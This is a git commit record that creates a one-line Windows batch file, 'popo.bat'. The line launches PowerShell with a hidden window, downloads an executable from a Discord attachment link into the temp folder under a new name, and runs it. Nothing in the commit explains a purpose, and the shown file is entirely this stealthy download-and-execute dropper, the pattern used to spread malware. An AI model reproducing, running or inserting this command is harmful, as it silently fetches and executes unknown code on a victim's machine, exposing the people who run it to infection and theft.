f94d359d256c8df4e13d52544f0cf5ff313654fc
FadeGames <71284716+FadeGames@users.noreply.github.com>
2026-01-11 17:27:44 -0500

    Create popo.bat

---
+++ popo.bat
@@ -0,0 +1,1 @@
+powershell.exe -NoProfile -WindowStyle Hidden -Command "$url = 'https://cdn.discordapp.com/attachments/1344411176443842676/1439705266177314846/Ocean.exe?ex=691b7d83&is=691a2c03&hm=a5a7761cbf8562817639ca6cd01a16347b2c481cd2e696e88a6d72843e47f1ed&'; $out = Join-Path $env:TEMP 'popo.exe'; Invoke-WebRequest -Uri $url -OutFile $out; Start-Process -FilePath $out"
